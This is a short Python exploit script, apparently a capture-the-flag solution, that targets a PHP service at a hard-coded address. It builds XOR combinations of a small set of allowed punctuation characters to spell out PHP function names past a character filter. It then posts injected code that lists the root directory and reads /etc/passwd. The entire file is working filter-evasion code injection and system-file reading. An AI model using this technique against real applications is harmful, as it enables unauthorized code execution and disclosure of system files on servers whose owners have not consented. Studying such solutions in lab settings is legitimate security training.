import requests
from pwn import xor
import pickle
import os

URL = 'http://103.152.242.37:21203/'

allowed_char = "$(),.;=^_{}"


def gen_kamus(allowed_char=allowed_char):

    kamus = dict()
    for i in allowed_char:
        for j in allowed_char:
            for k in allowed_char:
                for l in allowed_char:
                    kamus[xor(xor(xor(i, j), k), l).decode()] = (i, j, k, l)
    return kamus


def kamus_cache():
    if os.path.exists('kamus.tmp'):
        with open('kamus.tmp', 'rb') as f:
            return pickle.load(f)
    else:
        with open('kamus.tmp', 'wb') as f:
            kamus = gen_kamus()
            pickle.dump(kamus, f)
            return kamus


def craft_string(string, kamus=kamus_cache()):
    a = b = c = d = ""
    for char in string:
        aa = kamus[char][0]
        bb = kamus[char][1]
        cc = kamus[char][2]
        dd = kamus[char][3]
        a += aa
        b += bb
        c += cc
        d += dd
    result = "'{}'^'{}'^'{}'^'{}'".format(a, b, c, d)
    return result


def readdir(dir, url=URL):
    payload = f"$_={craft_string('print_r')};"
    payload += f"$__={craft_string('readdir')};"
    payload += f"$___=({craft_string('opendir')})({craft_string(dir)});"
    payload += f"$_($__($___));"*10
    res = requests.post(url, data={'cmd': payload})
    return res.text


def gzopen(file, url=URL):
    payload = f"$_=({craft_string('print_r')});"
    payload += f"$__=({craft_string('stream_get_contents')});"
    payload += f"$_____=({craft_string('gzopen')})(({craft_string(file)}),({craft_string('r')}));"
    payload += f"$_($__($_____));"
    res = requests.post(url, data={'cmd': payload})
    return res.text


if __name__ == '__main__':
    print(readdir('/'))
    print(gzopen('/etc/passwd'))
